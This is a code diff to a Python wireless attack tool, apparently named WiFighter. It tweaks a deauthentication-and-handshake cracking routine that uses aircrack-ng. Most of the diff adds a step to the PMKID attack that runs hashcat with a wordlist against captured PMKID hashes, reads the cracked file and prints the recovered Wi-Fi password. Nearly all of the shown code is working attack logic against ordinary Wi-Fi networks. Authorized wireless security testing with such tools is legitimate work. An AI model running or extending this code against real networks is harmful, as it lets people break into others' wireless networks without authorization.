@@ -836,7 +836,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
                     deauth_clients.join() # Wait for the process to stop
                     start_time = time.time() # Reset deauth timer
 
-          time.sleep(1)
+          time.sleep(2)
 
      delete_capture = False
      kill_airodump_processes() # Kill all airodump-ng processes
@@ -849,7 +849,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
      # Try cracking the password
      if wordlist:
           try:
-               print(f"{CYAN}[>]{RESET} Cracking handshake with {wordlist}")
+               print(f"{CYAN}[>]{RESET} Cracking handshake with aircrack-ng (CPU) using {wordlist}")
                command = ['sudo', 'aircrack-ng', '-w', f'wordlists/{wordlist}', f'{output_dir}/{output_file}']
                crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                output = str(crack.communicate())
@@ -868,7 +868,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
      
      if not password or not wordlist:
           print(f"\n{CYAN}[>]{RESET} Password not found...")
-          print(f"{YELLOW}[>]{RESET} Handshake available for offline cracking -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")
+          print(f"{YELLOW}[>]{RESET} Handshake available for offline cracking (use aircrack-ng/hashcat) -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")
 
 
 
@@ -938,7 +938,6 @@ def pmkid_attack(target_ap, interface, target):
                     command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash-{file_num}', f'{output_dir}/{output_file}']
                     verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                     output = str(verify.communicate())
-                    #print(output)
                except:
                     pass
                # Extract the caught PMKID's number value
@@ -946,16 +945,47 @@ def pmkid_attack(target_ap, interface, target):
                pmkid_match = re.search(pmkid_pattern, output) # Search for the pattern in the output string
                if pmkid_match:
                     pmkid = pmkid_match.group(1)
-                    #print(pmkid)
                     if int(pmkid) > 0:
-                         print(f"{CYAN}[>]{RESET}{pmkid} PMKID/s captured!")
+                         print(f"{CYAN}[>]{RESET} PMKID captured!")
                          captured = True
 
-          time.sleep(5)
+          time.sleep(6)
 
      delete_capture = False
      # Kill hcxdumptool process
      capture_pmkid.terminate()
+
+     try:
+          wordlist = choose_wordlist()
+     except KeyboardInterrupt:
+          pass
+     
+     # Try cracking the password
+     if wordlist:
+          try:
+               print(f"{CYAN}[>]{RESET} Cracking PMKID with hashcat (CPU) using {wordlist}")
+               command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash-{file_num}', f'wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked-{file_num}.txt']
+               crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+               output = str(crack.communicate())
+
+               # Extract and print the password if found
+               status_pattern = r'Status\.+:\s*(\w+)'
+               status_match = re.search(status_pattern, output) # Search for the pattern in the output string
+               if status_match:
+                    status = status_match.group(1)
+                    if status == 'Cracked':
+                         # Read the password from the cracked output file
+                         if os.path.exists(f'{output_dir}/pmkid_cracked-{file_num}.txt'):
+                              with open(f'{output_dir}/pmkid_cracked-{file_num}.txt', "r", encoding="utf-8") as file:
+                                   content = file.read()
+                                   password = content.split(':')[-1].strip()
+                                   print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
+          except KeyboardInterrupt:
+               pass
+     
+     if not password or not wordlist:
+          print(f"\n{CYAN}[>]{RESET} Password not found...")
+          print(f"{YELLOW}[>]{RESET} PMKID hash available for offline cracking (use hashcat) -> WiFighter/attacks/{target.replace(' ', '_')}/pmkid_hash-{file_num}")
 
 
 
